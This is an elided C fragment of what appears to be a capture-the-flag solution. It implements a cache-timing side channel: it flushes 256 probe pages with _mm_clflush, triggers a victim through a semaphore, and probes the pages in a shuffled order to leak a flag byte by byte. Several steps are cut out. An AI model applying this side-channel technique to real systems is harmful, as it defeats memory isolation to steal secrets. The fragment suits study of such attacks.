  ...
  *index = 0;
  ...
  while (leaked_chars < FLAG_LEN) {
    *index = (*index + 1) % (FLAG_LEN + 1);
    ...
    for (int k = 0; k < 256; k++) {
      _mm_clflush((char *) (0x1338000 + k * MY_PAGE_SIZE));
    }
    sem_post(sem);
    for (int i = 0; i < 256; i++) {
      int mixed_index = ((i * 167) + 13) & 255;
      char *deref_me = ptr_base + mixed_index * MY_PAGE_SIZE;
      ...
      //char *yep = (char *) (ptr_base + mixed_index * MY_PAGE_SIZE);
      //printf("Read value %c at %p\n", *yep, yep);
    }
  }
  return;
}
